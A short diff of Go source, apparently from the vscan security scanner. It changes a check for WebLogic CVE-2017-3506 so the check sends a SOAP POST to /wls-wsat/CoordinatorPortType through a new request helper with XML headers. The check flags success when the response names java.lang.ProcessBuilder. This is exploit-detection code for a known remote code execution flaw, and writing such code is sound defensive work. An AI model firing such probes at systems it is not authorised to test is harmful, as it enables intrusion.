@@ -2,7 +2,7 @@ package weblogic
 
 import (
 	"fmt"
-	"github.com/veo/vscan/poc"
+	"github.com/veo/vscan/pkg"
 	"strings"
 )
 
@@ -32,8 +32,11 @@ func CVE_2017_3506(url string) bool {
       <soapenv:Body/>
     </soapenv:Envelope>
 	`
-	if body, err := poc.Weblogicrequest(url+"/wls-wsat/CoordinatorPortType", "POST", post_str); err == nil {
-		if (strings.Contains(string(body), "<faultstring>java.lang.ProcessBuilder")) || (strings.Contains(string(body), "<faultstring>0")) {
+	header := make(map[string]string)
+	header["Content-Type"] = "text/xml;charset=UTF-8"
+	header["SOAPAction"] = ""
+	if req, err := pkg.HttpRequset(url+"/wls-wsat/CoordinatorPortType", "POST", post_str, false, header); err == nil {
+		if (strings.Contains(req.Body, "<faultstring>java.lang.ProcessBuilder")) || (strings.Contains(req.Body, "<faultstring>0")) {
 			fmt.Printf("weblogic-exp-sucess|CVE_2017_3506|%s\n", url)
 			return true
 		}
